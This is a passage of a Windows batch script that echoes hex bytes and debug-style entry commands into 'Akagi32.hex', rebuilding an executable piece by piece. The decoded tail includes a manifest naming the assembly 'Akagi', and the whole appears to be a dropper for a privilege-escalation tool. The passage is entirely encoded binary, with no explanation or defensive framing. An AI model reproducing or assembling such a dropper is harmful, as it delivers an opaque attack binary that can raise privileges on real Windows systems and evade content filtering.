echo 9a 3d 7a 0a 86 6c 29 3e 3c d2 26 95 5e 6a 2f a0 64 02 83 6e 9d 62 53 3c c6 1a 32 8d d6 8a c2 40 46 a4 35 3f 16 3e 3c 36 91 8a a2 ec e0 7c da bf 25 04 54 2e 93 ff 2e b7 83 57 49 40 3d e7 6f 03 61 10 c3 da f8 16 a2 ba 2c f4 5e bb 80 74 f3 49 95 f5 e3 80 0e 29 54 f5 be 9a 79 55 dd 1a ea b2 90 50 c2 ba 17 a6 1f a5 1b c4 ed d3 be 31 1a bc 61 70 85 83 62 35 00 03 6e 82 1d 73 e2 8f 6a 18>>Akagi32.hex
echo e 2680>>Akagi32.hex
echo 51 f2 d3 5c 7e 4d 8a a0 5f ff 13 5a fe 2c d8 30 35 e3 42 4e 36 39 5b a7 6e 23 ac 77 16 cd f2 34 09 b5 f4 71 96 0f 0a 91 95 06 3d ab 94 5c f0 e0 01 a8 7a f4 03 19 ab b6 de c6 32 3f db d0 18 30 41 e5 01 1d c6 ac d3 b5 2e 0e 20 1e 66 3c b0 90 61 d6 85 1b 7c 2d 9c f2 be ca 29 b3 e7 9c b4 80 01 c2 7a 1e 2e a4 0a b5 e0 9b 4d 46 b9 e4 1b a0 74 ae 0e da a6 66 4b a3 b6 6c b9 17 db d2 9c bb>>Akagi32.hex
echo e 2700>>Akagi32.hex
echo 99 f3 ca 88 e9 71 d1 77 4b d9 e8 9d 3d 9c 3b fc 14 28 a4 6f 10 db 54 33 ea 0c bb 15 65 cc a6 30 ea 04 f1 07 19 32 52 b5 e8 16 5d 02 8e 6c ad 47 71 e9 43 da ee d8 51 b3 2b 82 c8 d3 fe 45 dd c4 42 ec 74 21 31 26 a6 90 aa dc 99 0b b2 d5 20 40 69 f9 44 3b 62 08 e1 eb be de 4c 66 6f dc 98 bd 28 c0 8a bc 07 a0 1a b4 db 81 7f 2e 59 5f 11 d6 e8 c4 8d 9b 5b dd 40 cb 08 5f 81 73 ca b8 91 16>>Akagi32.hex
echo e 2780>>Akagi32.hex
echo 66 42 a6 6d a6 31 47 3e e3 07 86 ab 43 59 be 39 71 32 84 cb 19 9a 57 b1 e5 0d 79 72 1c cf 08 0c 07 fb 8d e3 15 93 66 45 55 2f 1f 5c 9d 9c 18 fd 92 8e 75 08 86 2a a4 b4 64 20 a9 44 02 a8 a6 03 a8 92 0c bf 5b c9 0f f7 9b 47 ac db af 06 98 ab 63 f2 95 06 93 ed 23 f8 ed a1 f9 83 e6 b8 d1 58 39 c2 83 86 b6 68 86 72 2e 3a ad 55 b6 4c ed 96 2d 32 84 1a 50 47 5b d7 6f 8c 46 53 93 3c 67 25>>Akagi32.hex
echo e 2800>>Akagi32.hex
echo 41 e1 86 17 9d 29 1f 59 4b d8 b8 a4 c3 78 27 b4 14 d2 e5 37 e9 58 53 48 be bd 69 69 6d 3c 73 29 01 c2 b7 29 fd 37 55 23 6b de af 5a c7 7d 11 c4 43 fe ed 0b a6 4c 08 95 ec da 8d 51 31 27 3a 35 37 c0 45 7f 0e 72 58 49 fa f2 cb 8c 77 04 58 d0 a3 d2 a4 35 e6 04 da 3b 82 78 e9 77 75 f7 cb 03 ba 82 e5 0a 96 16 0c e2 58 20 26 23 ae 69 19 bb 30 62 e1 82 4b d9 d2 ea ee 30 30 2e 16 24 03 ca>>Akagi32.hex
echo e 2880>>Akagi32.hex
echo f0 f4 8d 04 9e 58 ba 92 52 8b 41 54 f2 e8 b4 30 61 49 c0 fb 47 33 3a be ce dc bc 4d 46 d2 c8 5a 69 95 90 1f 5a dd cb 8f 23 56 ac da 48 f8 49 50 70 b6 a1 b4 77 2d d0 79 ed c4 3f 8d 36 a7 6a 2f 65 cd 0e db 77 73 1b 06 16 5d e0 b7 3d aa 78 ae 4a e2 e3 32 08 59 53 b6 4e e5 a1 9f 93 34 c8 12 50 fe 94 3a 0d 1f 79 34 6a cd bd 67 82 4f 16 73 63 c2 01 32 0f 58 83 4f d1 68 69 75 a5 ca 61 7f>>Akagi32.hex
echo e 2900>>Akagi32.hex
echo 67 c3 01 51 9d 2d 59 b3 bb d3 ac 58 b7 6c db 08 14 c3 86 58 b6 3d 70 b8 6d ae 86 f1 82 41 88 75 85 4a 9d 2f 72 db d1 88 2a 45 ce bf e0 3c 27 67 f1 c3 42 0f 53 e1 7a e1 e7 99 6d fe a3 8c 54 60 09 fd 85 04 96 32 a6 9d e2 8b 7d ab d5 b4 29 d3 e8 9f 05 d7 9f 70 bb 48 7b f4 eb 53 2e c3 10 1c a1 d0 ed d3 96 2a 9a b6 1a f6 a9 d0 ab 3c 58 b1 33 f6 15 62 ba 25 0b dd 6c ae b8 06 1a 33 4b b9>>Akagi32.hex
echo e 2980>>Akagi32.hex
echo a1 e0 97 36 c7 4f 2e be 56 86 12 4b 36 63 5d 5e c1 c8 7a 7e e2 ea 7b e1 ae b8 5f 11 e9 48 4e 40 60 e3 81 e8 a6 2c 8a b6 3c bc af db 91 6c dc 20 02 fa 7a 1e 0e cd 5e 35 6e 1d e7 fe b9 6e 94 64 29 47 5e 04 c4 79 e3 a5 e7 a6 ad d6 33 0c d8 d3 95 fb 7d 79 af 9c 3a 0e e3 99 05 5b e7 6f 9a f7 63 c1 4e aa 15 0d 75 a5 69 da 11 0b 15 6d aa 82 4a c3 ea 3a 16 7e 7a 84 62 2c b8 f8 3e 4d e8 be>>Akagi32.hex
echo e 2a00>>Akagi32.hex
echo 42 3d f0 b7 e9 38 2b bd 73 29 d8 9b 35 6c 18 ec 99 a8 85 48 86 0e da de 85 ca 8a a8 ed cd 9d dc 52 19 85 74 a5 6c 4a 15 6d 1c a1 a8 82 22 d2 b0 66 36 86 6b 4a 27 0d 61 6a 83 49 2d 6d 0f c3 d1 ee b6 dc 6e 16 dc 03 95 8f 2e 2c b7 ce 9c 1f 33 1c 62 89 0a 19 a8 49 96 77 2c 99 6a af ff c1 d8 bb 00 e1 04 93 fd 35 b5 fa 25 bc 1f 92 7c b6 a1 65 e6 a5 4e 21 0d 4b 7e 7f ac bb b4 d6 cc 10 21>>Akagi32.hex
echo e 2a80>>Akagi32.hex
echo d8 c8 a4 8b 26 a0 1e 91 33 be af 33 b2 6f d8 b7 51 c3 d9 5b 7e ad 79 b7 de cc 46 66 e6 dc 8a e1 55 bc f5 17 54 10 9b b4 18 a1 14 4b 16 bf 55 a8 e5 e6 ed eb 15 34 5d e3 4a 84 bd fe 6a 9e 99 d8 02 37 7a f4 1a 97 ea b5 6f d3 ac f9 42 93 27 e0 ec c6 a1 5b b6 28 4f f6 6e bc c2 c9 fe 0c 9c bc a1 c6 d5 1f 17 34 9a 90 78 96 52 6f 92 93 cd b8 d1 c5 7a c3 62 09 5f 24 6e b4 79 71 ef 6d f1 cd>>Akagi32.hex
echo e 2b00>>Akagi32.hex
echo 40 bb 85 5a 55 5c 86 35 62 f9 ad 44 b7 73 d9 b1 7e c3 2d bd b6 3b 7e b7 6e ee b9 43 ae cc a8 9a 37 c2 b5 0f 16 35 5a b5 6b a0 ad 63 1c e8 d8 a8 fb c2 89 bf 16 21 9d b7 62 f6 6b 73 ea 26 98 3c 99 c2 89 19 30 85 5a b5 45 d6 a1 63 b6 6a 88 b0 67 28 ef 0b 10 55 5b b1 e6 dc bf 72 98 c9 9e 30 2e c2 f0 0b 64 2d 7a b5 eb a5 ad 33 b6 05 d8 c0 61 d0 8d 63 16 4c 5b ad 4e dc db 73 ec a9 98 32>>Akagi32.hex
echo e 2b80>>Akagi32.hex
echo 0f c0 94 62 16 59 5a b7 4a d4 9f 38 b6 03 d8 dd 61 c0 e6 0b 19 41 5b 84 6e ee b9 13 c8 cc fc 30 0d c2 84 0e 59 40 4f b5 2e b5 ad 0a d9 6c 9b df 61 a4 d4 0b 31 03 5b c0 6e cf d7 73 c1 a3 b5 30 68 b1 85 3a 15 6e 37 b5 22 b8 ad f9 9b 6c 93 df 61 ac 85 2c 64 2d 54 b1 02 dc 8c 70 af 90 98 6c 61 fd 50 0b 15 4a da 98 04 56 e8 3a 36 6f 59 a0 cb ad 05 1f 4a ad 49 ce ee dd cd f3 a9 42 f5 b2>>Akagi32.hex
echo e 2c00>>Akagi32.hex
echo 54 41 8f 88 25 5e 5a cd eb db b7 07 b6 4f 84 32 4c 51 d3 5f 77 5e 5b dc 2a b5 d8 1f 89 ab d1 30 0f a6 ec 79 73 4e 2e b5 3e 56 9b 09 36 ec bb 30 19 81 07 46 62 68 d9 9a 02 5c b2 32 e6 a7 18 ba 06 c1 05 68 97 63 06 b5 39 d6 e8 5b 36 2b d8 f9 61 91 85 5f 96 28 31 ee ee cc ec f3 e3 89 18 35 e2 f9 85 5e 96 2b 35 37 15 a1 2d 40 c4 ec 8b ec cb c2 0e 2a 5a ad 6b c1 ee d7 f5 f3 e7 d6 ec b0>>Akagi32.hex
echo e 2c80>>Akagi32.hex
echo 08 a7 05 3e 97 00 13 b5 4c 7b 2d f4 96 ec f5 31 59 b8 05 c5 75 6f 3d 9d 4f 9c 9c 3d 26 c0 ec f0 60 e5 85 dd 5d 6d 4f f4 31 b8 ef 4c df ac d4 71 66 68 d5 cb 5e 48 1b b3 1d 1c ad 53 26 d8 72 51 21 ef e0 cb 1d 4e 18 bc 2a d4 6c 7f 01 2d de 71 19 83 97 7b 54 2b 1a b5 1a 1c af db 89 cc b4 70 6a ad 47 31 6f e9 21 65 4e d6 de 5b 79 36 fd f0 5d 0b 80 a0 57 af 1a 89 6e 9c e5 1e a6 b6 b6 70>>Akagi32.hex
echo e 2d00>>Akagi32.hex
echo 41 98 fd cb 16 2d 9a 84 a8 cd c4 9b ce 07 75 f0 76 b5 c5 0e d7 bb 37 77 6f ab 79 70 4c b9 5a ac 12 82 9a 66 56 29 2e 77 51 ce c3 5b d1 28 c7 f1 25 c2 85 5f be 0f 8a ef 2f de b4 73 e7 10 58 30 a1 56 a6 0b 16 b9 49 b5 69 56 ad 06 73 6a d6 33 62 90 84 ce 1e 5f 9b ba 37 84 b8 73 e6 4c 98 f2 61 aa 45 08 7a 28 9a b5 1b 16 ad bb a2 6c d8 31 62 02 84 4b 3a 46 3a cd 1b bf d1 73 8f ff aa 1e>>Akagi32.hex
echo e 2d80>>Akagi32.hex
echo 05 ae e9 0b 29 3c d0 6d 71 69 ab 24 a6 53 d0 87 65 6e a1 46 71 2e 33 57 e6 9c 8d 73 22 a4 9a aa f8 22 02 13 36 de 5d ca fe d6 ad 24 23 68 d8 b0 0c 57 3b 09 51 48 2f b7 3d a8 d8 01 92 b9 e8 79 61 ac e3 64 41 2d 0f b4 2e d6 d5 2b d7 02 bc f5 0f b4 05 62 64 42 35 da 0b b2 59 70 e6 be f1 5e 06 b1 d2 0b ec 2d 59 fa 1e a2 dd 2e c2 28 98 d5 03 b7 e2 58 62 8c 59 e0 6e dc b9 0c e6 8f f4 5f>>Akagi32.hex
echo e 2e00>>Akagi32.hex
echo 12 c6 e0 43 96 2b 36 d0 6b 0d ad 5b f5 1e bd d1 15 a7 d5 79 06 42 38 d2 1d 5c bf 73 ad 89 88 62 2f 87 c9 6f 28 2d 72 b4 69 98 4d 5c da 09 ac d5 2a a7 8d 72 16 64 fb b6 28 ae dc 16 e2 9a f1 10 71 a3 e9 46 73 40 d2 da 19 af 0d 39 fa 08 aa b0 72 c3 e7 03 72 58 29 d2 2f b8 dd 71 94 4c 91 30 61 5d 87 59 62 6d 36 f4 07 ba c2 38 f6 60 90 90 04 a3 f5 0b 68 0d 53 f8 1e f8 dc 1d 47 c5 77 33>>Akagi32.hex
echo e 2e80>>Akagi32.hex
echo c1 c1 cc 65 16 44 2e e0 05 bf ce 34 d2 2e bd f3 75 c2 85 8b 16 cd 52 fb 7e b3 d8 17 a2 6c d6 30 a9 c2 a9 45 62 68 52 5e 65 bc 4c 5f f3 02 e8 c5 0c a7 f7 cb 1d 2c 5d d2 0a dc f4 1c 82 b9 f4 55 12 c2 23 e0 b6 2b b8 a9 6b a1 89 55 f2 0e 43 e1 81 d7 ca 69 7c ac c7 1f 8e de e8 e3 93 a9 ea 49 6c c1 85 9e f7 3f 01 74 77 f4 bb b5 13 78 1c a3 b3 27 83 5d de 4c 37 c2 cc fe d7 07 26 af da 54>>Akagi32.hex
echo e 2f00>>Akagi32.hex
echo 9e 71 c4 b4 14 12 5e 8a 6f e9 a9 64 b2 53 dc 8f 65 85 ba 0f 29 29 64 b3 6f dc a9 33 e4 d4 b3 f1 43 08 87 0a e4 61 6a ca 6a d6 a4 0b b2 6c d8 f8 d1 c0 e5 cb 17 f5 1d b5 24 df 7b 73 3e ce ac 40 61 94 d4 fb 7c 72 5a e3 3b bb ff cb b6 25 98 b0 2e c2 cb 0b 49 9d 00 f9 62 dc ff c3 e6 4d 9a 8d 65 2d 7b 0a 87 7e 5d b5 69 d6 05 5d b6 b6 d8 c5 61 fd 44 0a 24 2d 5f 27 6f 1a b9 06 64 cc ae c0>>Akagi32.hex
echo e 2f80>>Akagi32.hex
echo 67 c3 75 0f 67 59 ab ea 0c 83 7d 5f df 5e b2 f9 b1 a2 e3 3b 49 2d 5f b7 7c ee bb 43 e6 f8 98 00 15 c2 bc 3b 16 19 ea cb cb dc 3d de bf c7 e8 bd 10 ba e8 1b 74 4c ab b5 17 ec b0 d9 87 7c e9 55 d3 c7 d0 fb 61 0d 4a b4 c5 b9 dd 28 e7 0f 99 b1 29 12 94 0a 20 2b f1 f3 9e b8 ca 83 8e be c8 4b 11 12 f5 01 7f dd 5c db df d5 ec 5b f5 6c 82 fd 91 c3 a5 bb 13 7c de cf be e0 99 63 e6 88 98 7c>>Akagi32.hex
echo e 3000>>Akagi32.hex
echo 71 c2 85 0b 20 99 5a be db d1 eb 2b b5 3d b2 e6 11 c0 2b 79 46 5d ac b4 3f 53 8e 03 6a fc a8 30 f9 f3 85 3c 44 26 db b0 59 d6 9c 50 6d dd d5 21 e8 b0 b5 00 47 a6 15 87 18 6d d4 24 57 bc a3 4d 50 c1 e3 9b 78 2c 0a b2 0e 61 9d 34 67 6e c9 bf 11 12 8d 5a 1d 4a 8b c7 c5 bc 30 c3 ec a3 e8 3a 18 52 8b 62 46 2f d8 dd db da 8d 5b 1f 6c f8 80 73 aa b5 0b 27 fd 51 97 3e 48 6c 73 d1 4f e8 31>>Akagi32.hex
echo e 3080>>Akagi32.hex
echo de d3 85 0b 54 2d 57 85 66 28 e2 6f b2 bd c0 61 67 f7 8b 7a 92 12 51 a6 cf 8d 40 ee ca cc 9e 00 65 92 b5 0f 79 18 6a cb 1e 66 b8 2f 8a 75 ad a5 61 c2 3b 31 24 39 e0 b5 f3 c8 c6 67 57 e4 98 40 79 df 14 2d 40 9f d3 a0 61 c1 8e 5b b6 48 8e b0 21 ef 15 9c 64 3d 59 d9 fe c5 d5 6e 96 cc ec e0 7b b3 21 3a 03 24 5e 05 94 d7 af fa b6 53 d8 af 60 dd 84 14 17 32 5a a8 6f 63 a6 72 f9 cd 87 31>>Akagi32.hex
echo e 3100>>Akagi32.hex
echo 7e c3 9e 0a 16 12 da a5 6a d6 d1 69 30 5e 67 82 ac f0 85 11 25 71 68 ca 5d 57 8a 73 00 ff 71 04 68 f7 ac 3e 16 1f 6f f3 5e 99 98 0d 83 6c 84 85 f8 f7 59 3e fa 18 5b db 58 70 8f cd d0 01 ae 30 bf f4 74 3d ca 1a b6 82 6b 25 9a 01 8e e7 e0 70 59 c2 72 33 12 14 4b 8e 27 e5 b9 1c df b4 a1 e1 58 33 bc 0b 16 17 53 8f 7d ec 8a 61 b6 50 e2 f5 5b 94 bf 6f 2c 2d cc 8d f3 e6 53 49 eb f7 98 23>>Akagi32.hex
echo e 3180>>Akagi32.hex
echo 5a 8c be 89 2d a2 61 75 f2 ed 33 60 12 57 73 b8 be c2 7a 14 17 32 5a a8 6f c3 b8 6c e7 d3 99 2f 60 dd 84 f4 09 2c 45 b4 74 d7 b2 5a a9 6d c7 b1 7e c3 9a 0a 19 32 5a a8 6f c3 b8 6a e7 00 00 00 ef bb bf 3c 3f 78 6d 6c 20 76 65 72 73 69 6f 6e 3d 22 31 2e 30 22 20 65 6e 63 6f 64 69 6e 67 3d 22 55 54 46 2d 38 22 20 73 74 61 6e 64 61 6c 6f 6e 65 3d 22 79 65 73 22 3f 3e 0d 0a 3c 61 73 73>>Akagi32.hex
echo e 3200>>Akagi32.hex
echo 65 6d 62 6c 79 20 6d 61 6e 69 66 65 73 74 56 65 72 73 69 6f 6e 3d 22 31 2e 30 22 20 78 6d 6c 6e 73 3d 22 75 72 6e 3a 73 63 68 65 6d 61 73 2d 6d 69 63 72 6f 73 6f 66 74 2d 63 6f 6d 3a 61 73 6d 2e 76 31 22 20 78 6d 6c 6e 73 3a 61 73 6d 76 33 3d 22 75 72 6e 3a 73 63 68 65 6d 61 73 2d 6d 69 63 72 6f 73 6f 66 74 2d 63 6f 6d 3a 61 73 6d 2e 76 33 22 3e 3c 61 73 73 65 6d 62 6c 79 49 64 65>>Akagi32.hex
echo e 3280>>Akagi32.hex
echo 6e 74 69 74 79 20 74 79 70 65 3d 22 77 69 6e 33 32 22 20 6e 61 6d 65 3d 22 41 6b 61 67 69 22 20 76 65 72 73 69 6f 6e 3d 22 31 2e 30 2e 30 2e 30 22 20 70 72 6f 63 65 73 73 6f 72 41 72 63 68 69 74 65 63 74 75 72 65 3d 22 2a 22 3e 3c 2f 61 73 73 65 6d 62 6c 79 49 64 65 6e 74 69 74 79 3e 3c 64 65 73 63 72 69 70 74 69 6f 6e 3e 41 6b 61 67 69 20 77 61 73 20 61 6e 20 61 69 72 63 72 61 66>>Akagi32.hex
echo e 3300>>Akagi32.hex
echo 74 20 63 61 72 72 69 65 72 20 6f 66 20 74 68 65 20 49 6d 70 65 72 69 61 6c 20 4a 61 70 61 6e 65 73 65 20 4e 61 76 79 20 28 49 4a 4e 29 2c 20 6e 61 6d 65 64 20 61 66 74 65 72 20 4d 6f 75 6e 74 20 41 6b 61 67 69 20 69 6e 20 70 72 65 73 65 6e 74 2d 64 61 79 20 47 75 6e 6d 61 20 50 72 65 66 65 63 74 75 72 65 2e 3c 2f 64 65 73 63 72 69 70 74 69 6f 6e 3e 3c 64 65 70 65 6e 64 65 6e 63 79>>Akagi32.hex
echo e 3380>>Akagi32.hex
echo 3e 3c 64 65 70 65 6e 64 65 6e 74 41 73 73 65 6d 62 6c 79 3e 3c 61 73 73 65 6d 62 6c 79 49 64 65 6e 74 69 74 79 20 74 79 70 65 3d 22 77 69 6e 33 32 22 20 6e 61 6d 65 3d 22 4d 69 63 72 6f 73 6f 66 74 2e 57 69 6e 64 6f 77 73 2e 43 6f 6d 6d 6f 6e 2d 43 6f 6e 74 72 6f 6c 73 22 20 76 65 72 73 69 6f 6e 3d 22 36 2e 30 2e 30 2e 30 22 20 70 75 62 6c 69 63 4b 65 79 54 6f 6b 65 6e 3d 22 36 35>>Akagi32.hex
echo e 3400>>Akagi32.hex
echo 39 35 62 36 34 31 34 34 63 63 66 31 64 66 22 20 6c 61 6e 67 75 61 67 65 3d 22 2a 22 20 70 72 6f 63 65 73 73 6f 72 41 72 63 68 69 74 65 63 74 75 72 65 3d 22 2a 22 3e 3c 2f 61 73 73 65 6d 62 6c 79 49 64 65 6e 74 69 74 79 3e 3c 2f 64 65 70 65 6e 64 65 6e 74 41 73 73 65 6d 62 6c 79 3e 3c 2f 64 65 70 65 6e 64 65 6e 63 79 3e 3c 74 72 75 73 74 49 6e 66 6f 20 78 6d 6c 6e 73 3d 22 75 72 6e>>Akagi32.hex
echo e 3480>>Akagi32.hex
echo 3a 73 63 68 65 6d 61 73 2d 6d 69 63 72 6f 73 6f 66 74 2d 63 6f 6d 3a 61 73 6d 2e 76 33 22 3e 3c 73 65 63 75 72 69 74 79 3e 3c 72 65 71 75 65 73 74 65 64 50 72 69 76 69 6c 65 67 65 73 3e 3c 72 65 71 75 65 73 74 65 64 45 78 65 63 75 74 69 6f 6e 4c 65 76 65 6c 20 6c 65 76 65 6c 3d 22 61 73 49 6e 76 6f 6b 65 72 22 20 75 69 41 63 63 65 73 73 3d 22 66 61 6c 73 65 22 3e 3c 2f 72 65 71 75>>Akagi32.hex
echo e 3500>>Akagi32.hex
echo 65 73 74 65 64 45 78 65 63 75 74 69 6f 6e 4c 65 76 65 6c 3e 3c 2f 72 65 71 75 65 73 74 65 64 50 72 69 76 69 6c 65 67 65 73 3e 3c 2f 73 65 63 75 72 69 74 79 3e 3c 2f 74 72 75 73 74 49 6e 66 6f 3e 3c 2f 61 73 73 65 6d 62 6c 79 3e 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>Akagi32.hex
echo e 3580>>Akagi32.hex
echo 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>Akagi32.hex
echo e 3600>>Akagi32.hex
echo 00 10 00 00 38 01 00 00 a4 33 ab 33 bf 33 16 34 3a 34 4c 34 5a 34 64 34 79 34 7e 34 97 34 ca 34 39 35 4c 35 5d 35 64 35 73 35 7a 35 a1 35 c2 35 c7 35 f7 35 10 36 39 36 60 36 66 36 6b 36 76 36 83 36 8b 36 90 36 99 36 a0 36 ad 36 b4 36 bd 36 c4 36 d2 36 d7 36 e1 36 e6 36 f2 36 fa 36 ff 36 09 37 1a 37 51 37 7a 37 83 37 8a 37 94 37 c6 37 d1 37 e2 37 e8 37 f6 37 03 38 0a 38 12 38 1d 38>>Akagi32.hex
echo e 3680>>Akagi32.hex
echo 28 38 33 38 39 38 41 38 4d 38 53 38 6a 38 76 38 87 38 92 38 97 38 a9 38 b0 38 be 38 cf 38 e4 38 f2 38 08 39 0d 39 12 39 7c 39 88 39 8f 39 96 39 c1 39 e0 39 e9 39 f6 39 44 3a 4c 3a 5c 3a 64 3a 6a 3a 70 3a 7f 3a 86 3a a7 3a ae 3a b8 3a c1 3a d0 3a d6 3a ec 3a f2 3a 36 3b 43 3b 6a 3b 80 3b a7 3b bd 3b d6 3b e7 3b 06 3c 1b 3c 32 3c 43 3c 7e 3c 90 3c a4 3c 0e 3d 23 3d 30 3d 41 3d ee 3d>>Akagi32.hex
echo e 3700>>Akagi32.hex
echo 04 3e 0a 3e 50 3e 55 3e 5a 3e 5f 3e 64 3e 69 3e 6e 3e 73 3e 78 3e 7d 3e 8a 3e 9f 3e a5 3e e5 3e 2d 3f 32 3f 37 3f 55 3f 6f 3f 74 3f 82 3f 8e 3f 9a 3f a0 3f e4 3f 00 00 00 20 00 00 10 01 00 00 00 30 1c 30 35 30 6b 30 f1 30 1a 31 3b 31 cc 31 12 32 23 32 29 32 4e 32 58 32 72 32 81 32 d3 32 e3 32 08 33 0e 33 58 33 b3 33 c2 33 fe 33 0e 34 39 34 3f 34 4a 34 61 34 78 34 86 34 8e 34 9b 34>>Akagi32.hex
echo e 3780>>Akagi32.hex
echo cc 34 dc 34 ec 34 06 35 10 35 17 35 27 35 46 35 5e 35 6b 35 f2 35 02 36 5f 36 6a 36 77 36 80 36 9d 36 a6 36 bc 36 f0 36 fe 36 1c 37 2c 37 37 37 48 37 6f 37 ac 37 d8 37 04 38 30 38 5c 38 8b 38 9c 38 a5 38 ab 38 c7 38 d6 38 e8 38 0b 39 38 39 48 39 63 39 a2 39 af 39 bc 39 ce 39 e0 39 2d 3a 33 3a 64 3a 74 3a 94 3a ab 3a c7 3a d2 3a ef 3a f8 3a 11 3b 17 3b 27 3b 69 3b b2 3b c7 3b cd 3b>>Akagi32.hex
echo e 3800>>Akagi32.hex
echo 01 3c 25 3c 3c 3c 47 3c ca 3c 71 3d c6 3d d0 3d ef 3d f5 3d 0b 3e 22 3e 27 3e 2d 3e 32 3e 42 3e 4a 3e 76 3e 7d 3e 8a 3e 90 3e 96 3e ec 3e fa 3e 23 3f 29 3f 5a 3f 72 3f 87 3f 8d 3f 93 3f a2 3f ae 3f cf 3f ec 3f f5 3f 00 30 00 00 60 01 00 00 00 30 11 30 1d 30 26 30 31 30 3c 30 4d 30 70 30 7d 30 b4 30 e3 30 ee 30 11 31 1a 31 39 31 41 31 4f 31 5f 31 69 31 81 31 8a 31 9f 31 b3 31 b9 31>>Akagi32.hex
echo e 3880>>Akagi32.hex
echo c9 31 f3 31 f9 31 06 32 0c 32 25 32 33 32 97 32 a9 32 c7 32 f8 32 14 33 1d 33 3d 33 4b 33 91 33 a1 33 cb 33 0a 34 40 34 6a 34 95 34 ca 34 da 34 e6 34 00 35 11 35 2b 35 41 35 53 35 61 35 75 35 85 35 92 35 9f 35 b9 35 c5 35 d1 35 de 35 eb 35 05 36 11 36 3d 36 44 36 73 36 ae 36 be 36 ee 36 fe 36 08 37 21 37 48 37 5a 37 6c 37 73 37 7f 37 84 37 8b 37 ab 37 b9 37 c5 37 d4 37 d9 37 e9 37>>Akagi32.hex
echo e 3900>>Akagi32.hex
echo f9 37 0e 38 29 38 3e 38 44 38 55 38 6f 38 a1 38 a9 38 af 38 b8 38 cb 38 d7 38 dc 38 ea 38 ef 38 fb 38 0d 39 19 39 1e 39 2e 39 33 39 41 39 54 39 59 39 69 39 7a 39 92 39 99 39 03 3a 13 3a 35 3a 49 3a 7b 3a 9e 3a ce 3a e2 3a eb 3a 06 3b 14 3b 24 3b 36 3b 3e 3b 57 3b 63 3b 7b 3b 8b 3b ab 3b d6 3b fd 3b 0b 3c 7f 3c 8f 3c 99 3c a9 3c c4 3c e2 3c 1c 3d 2c 3d 4c 3d 5c 3d 7f 3d a4 3d b4 3d>>Akagi32.hex
echo e 3980>>Akagi32.hex
echo de 3d ee 3d 31 3e 38 3e 55 3e 65 3e 6f 3e 97 3e e8 3e 11 3f 26 3f 30 3f 48 3f 66 3f 7b 3f 82 3f 92 3f a5 3f b5 3f f2 3f 00 40 00 00 e4 00 00 00 05 30 b2 30 d1 30 d6 30 eb 30 f6 30 13 31 35 31 4d 31 52 31 6b 31 89 31 9d 31 aa 31 b6 31 c3 31 e5 31 0e 32 48 32 55 32 78 32 89 32 99 32 e6 32 f9 32 21 33 34 33 96 33 9f 33 a5 33 fb 33 0b 34 1b 34 3f 34 5e 34 6e 34 2b 35 66 35 a5 35 e1 35>>Akagi32.hex
echo e 3a00>>Akagi32.hex
echo 0a 36 1a 36 48 36 cf 36 df 36 e9 36 01 37 4e 37 5e 37 91 37 a1 37 d9 37 e9 37 59 38 7d 38 9d 38 d5 38 e5 38 12 39 22 39 82 39 92 39 a2 39 b2 39 d3 39 12 3a 60 3a 70 3a 7c 3a 91 3a dc 3a 0d 3b 45 3b 7c 3b 8c 3b 9c 3b ac 3b cd 3b fc 3b 4c 3c 5c 3c 66 3c 7b 3c 9f 3c d5 3c f1 3c 47 3d b2 3d d4 3d 07 3e 21 3e 96 3e 9c 3e d0 3e e0 3e ec 3e f2 3e 01 3f 08 3f 0d 3f 1a 3f 21 3f 26 3f 33 3f>>Akagi32.hex
echo e 3a80>>Akagi32.hex
echo 3a 3f 3f 3f 9e 3f ae 3f e7 3f f8 3f 00 50 00 00 20 01 00 00 27 30 61 30 88 30 92 30 9c 30 a9 30 af 30 fc 30 10 31 4b 31 79 31 84 31 c2 31 d0 31 da 31 ee 31 16 32 30 32 60 32 89 32 dc 32 e7 32 f3 32 29 33 3f 33 4f 33 82 33 b6 33 c5 33 ea 33 7b 34 92 34 9b 34 a2 34 a8 34 ed 34 fb 34 0b 35 32 35 5e 35 65 35 a9 35 e0 35 05 36 1c 36 3f 36 83 36 a2 36 c1 36 08 37 18 37 39 37 60 37 70 37>>Akagi32.hex
echo e 3b00>>Akagi32.hex
echo 7f 37 a1 37 ab 37 d4 37 e5 37 f5 37 01 38 1f 38 35 38 41 38 66 38 86 38 a0 38 ab 38 e2 38 1a 39 31 39 70 39 a6 39 ab 39 d0 39 eb 39 07 3a 1d 3a 26 3a 31 3a 41 3a 70 3a 79 3a 7e 3a 8c 3a a9 3a f9 3a 09 3b 7d 3b 94 3b 99 3b a8 3b c0 3b c6 3b e4 3b 03 3c 09 3c 0e 3c 2e 3c 37 3c 3f 3c 44 3c 52 3c 66 3c 8c 3c b5 3c c3 3c d0 3c 0c 3d 19 3d 1f 3d 37 3d 43 3d 49 3d 81 3d 89 3d 8f 3d ac 3d>>Akagi32.hex
echo e 3b80>>Akagi32.hex
echo b2 3d cd 3d dc 3d e4 3d 6d 3e 75 3e 7b 3e 98 3e 9e 3e b9 3e c8 3e d0 3e 73 3f 7b 3f 81 3f a0 3f a6 3f c7 3f d3 3f dc 3f f1 3f 00 00 00 60 00 00 0c 01 00 00 aa 30 ba 30 de 30 17 31 21 31 41 31 51 31 6b 31 a2 31 d4 31 e6 31 f6 31 26 32 2d 32 34 32 44 32 54 32 5b 32 62 32 72 32 91 32 1f 33 5f 33 a3 33 b5 33 e6 33 f5 33 1a 34 2c 34 66 34 88 34 c3 34 d3 34 e4 34 ea 34 07 35 15 35 49 35>>Akagi32.hex
echo e 3c00>>Akagi32.hex
